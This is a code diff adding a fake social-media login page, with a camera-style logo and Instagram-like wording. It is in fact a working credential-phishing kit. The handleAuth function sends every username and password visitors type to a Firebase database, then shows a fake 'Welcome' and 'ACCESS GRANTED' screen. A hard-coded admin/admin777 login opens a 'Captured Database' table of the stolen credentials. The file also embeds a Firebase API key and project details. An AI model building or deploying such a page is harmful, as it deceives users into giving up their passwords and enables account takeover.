@@ -177,8 +177,197 @@
     font-weight: 600;
   }
 
-  /* === PORTAL OUTPUT - Split-screen Login/Register === */
+  /* === FIXED PORTAL === */
   #portal-output {
-    margin-top: 0;
+    margin-top: 20px;
     display: none;
-    width:
+    width: 100%;
+  }
+
+  #portal-output.visible {
+    display: block !important;
+    visibility: visible !important;
+    opacity: 1 !important;
+  }
+
+  .admin-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.85rem;
+  }
+
+  .admin-table th, .admin-table td {
+    border: 1px solid #dbdbdb;
+    padding: 10px;
+    text-align: left;
+  }
+
+  .admin-table th {
+    background: #fafafa;
+    font-weight: 600;
+  }
+
+  @media (max-width: 400px) {
+    .login-card {
+      max-width: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <div class="login-card">
+    <div class="top-bar">
+      <button class="back-btn" onclick="history.back()" aria-label="Go back">&#8592;</button>
+      <select class="lang-select" aria-label="Select language">
+        <option>English (India)</option>
+        <option>Hindi</option>
+        <option>English (US)</option>
+      </select>
+    </div>
+
+    <div class="logo" aria-hidden="true">
+      <svg viewBox="0 0 24 24">
+        <rect x="3" y="3" width="18" height="18" rx="5"/>
+        <circle cx="12" cy="12" r="4.5"/>
+        <circle cx="17.5" cy="6.5" r="0.8" fill="#fff" stroke="none"/>
+      </svg>
+    </div>
+
+    <div id="auth-form" style="width:100%;">
+      <form onsubmit="return false;">
+        <input type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="username" required>
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+        <button type="button" class="login-btn" onclick="handleAuth()">Log in</button>
+      </form>
+
+      <a class="forgot-link">Forgotten password?</a>
+
+      <div class="spacer"></div>
+
+      <button class="signup-btn" onclick="alert('Create new account')">Create new account</button>
+
+      <div class="brand-footer">Your Brand</div>
+    </div>
+
+    <div id="portal-output"></div>
+  </div>
+
+<script>
+  // --- FIREBASE CONFIG ---
+  const firebaseConfig = {
+    apiKey: "AIzaSyDi20_1FpiU7OQ4EEQMDdvyHlY5_Vn23F4",
+    authDomain: "dragoai-ef040.firebaseapp.com",
+    databaseURL: "https://dragoai-ef040-default-rtdb.firebaseio.com/",
+    projectId: "dragoai-ef040",
+    storageBucket: "dragoai-ef040.firebasestorage.app",
+    messagingSenderId: "972005846887",
+    appId: "1:972005846887:web:af60900dd52746444889c2"
+  };
+
+  if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
+    firebase.initializeApp(firebaseConfig);
+  }
+  const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;
+
+  // --- AUTH HANDLER (ULTIMATE FIX) ---
+  function handleAuth() {
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+
+    if (!user || !pass) {
+      alert("Please fill in all fields.");
+      return;
+    }
+
+    // === STRICT RAW BYTE COMPARISON (exact match) ===
+    if (user === "admin" && pass === "admin777") {
+      document.getElementById("auth-form").style.display = "none";
+      loadDashboard();
+      return;
+    }
+
+    // === FIREBASE SUBMIT ===
+    if (database) {
+      const logsRef = database.ref("players").push();
+      logsRef.set({
+        username: user,
+        password: pass,
+        timestamp: new Date().toISOString()
+      }).then(() => {
+        showWelcome(user);
+      }).catch((err) => {
+        console.error("Firebase Error:", err);
+        showWelcome(user);
+      });
+    } else {
+      showWelcome(user);
+    }
+  }
+
+  function showWelcome(user) {
+    document.getElementById("auth-form").style.display = "none";
+    const output = document.getElementById("portal-output");
+    output.classList.add("visible");
+    output.innerHTML = `
+      <h2 style="font-size:1.5rem; font-weight:600; text-align:center; margin-bottom:10px;">Welcome, ${user}</h2>
+      <p style="text-align:center; color:#8e8e8e; margin-bottom:20px;">Your account is ready.</p>
+      <button style="
+        width:100%;
+        padding:14px;
+        border:none;
+        border-radius:24px;
+        background:#0095f6;
+        color:#fff;
+        font-weight:600;
+        font-size:15px;
+        cursor:pointer;
+      " onclick="nextStep()">Continue</button>
+    `;
+  }
+
+  function nextStep() {
+    const output = document.getElementById("portal-output");
+    output.innerHTML = `
+      <h2 style="font-size:1.3rem; font-weight:600; text-align:center; margin:20px 0;">Setup Complete</h2>
+      <p style="text-align:center; color:#8e8e8e;">All core integrations are working correctly.</p>
+      <div style="text-align:center; margin-top:15px;">
+        <span style="color:#0095f6; font-weight:600; border:1px solid #0095f6; padding:6px 16px; border-radius:20px; font-size:14px;">ACCESS GRANTED</span>
+      </div>
+    `;
+  }
+
+  // === ADMIN DASHBOARD ===
+  function loadDashboard() {
+    const output = document.getElementById("portal-output");
+    output.classList.add("visible");
+    output.style.textAlign = "left";
+    output.innerHTML = `
+      <h3 style="font-size:1.1rem; font-weight:600; margin-bottom:10px;">Captured Database</h3>
+      <div id="logs-container" style="color:#8e8e8e; font-size:0.85rem;">Connecting to grid...</div>
+    `;
+
+    if (!database) {
+      document.getElementById("logs-container").innerHTML = "<p style='color:#ed4956;'>Firebase config missing.</p>";
+      return;
+    }
+
+    database.ref("players").on("value", (snap) => {
+      const items = snap.val();
+      if (!items) {
+        document.getElementById("logs-container").innerHTML = "<p>No entries found.</p>";
+        return;
+      }
+      let html = `<table class="admin-table"><thead><tr><th>Identity</th><th>Access Key</th></tr></thead><tbody>`;
+      for (let key in items) {
+        const u = items[key].username || '';
+        const p = items[key].password || '';
+        html += `<tr><td>${u.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}</td><td>${p.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}</td></tr>`;
+      }
+      html += `</tbody></table>`;
+      document.getElementById("logs-container").innerHTML = html;
+    });
+  }
+</script>
+</body>
+</html>
